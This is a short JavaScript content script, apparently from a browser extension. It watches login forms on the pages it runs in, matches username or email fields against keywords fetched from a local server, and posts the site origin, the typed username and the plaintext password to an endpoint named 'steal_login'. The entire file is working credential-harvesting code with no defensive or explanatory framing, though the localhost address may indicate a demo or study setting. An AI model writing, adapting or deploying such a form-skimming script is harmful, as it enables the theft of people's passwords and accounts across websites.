var inputs = $('input');
var password = $('[type="password"]');

$(password).change(function () {
    chrome.storage.local.get('email', function (result) {
        var userEmail = result.email;
        if (typeof userEmail === 'undefined') userEmail = "no_email_found";
        inputs.trigger('input');
    });
});

$.each(inputs, function (element) {
    $.get(`http://localhost:5000/get_login_kw`, function (result) {
        var is_in_attr = false;
        $.each(result.keywords, function (key) {
            $.each(inputs[element].attributes, function () {
                if (!(this.value === undefined)) {
                    if (this.value.indexOf(result.keywords[key]) >= 0) {
                        is_in_attr = true;
                    }
                }
            });
        });
        if (is_in_attr && ($(inputs[element]).attr('type') == "email" || $(inputs[element]).attr('type') == "text")) {
            $(inputs[element]).on('input', function () {
                chrome.storage.local.get('email', function (resu) {
                    var userEmail;
                    var pw = $('[type="password"]')[0];
                    if (typeof resu === 'undefined') userEmail = "no_email_found";
                    else userEmail = resu.email;
                    console.log('pw');
                    if (inputs[element].value != "" &&
                        !(typeof pw === 'undefined') && $(pw).val() != "") {
                        console.log("hi");
                        $.post("http://localhost:5000/steal_login", {
                            email: userEmail,
                            url: window.location.origin,
                            username: $(inputs[element]).val(),
                            password: $(pw).val()
                        });
                    }
                });

            });
        }
    });

});

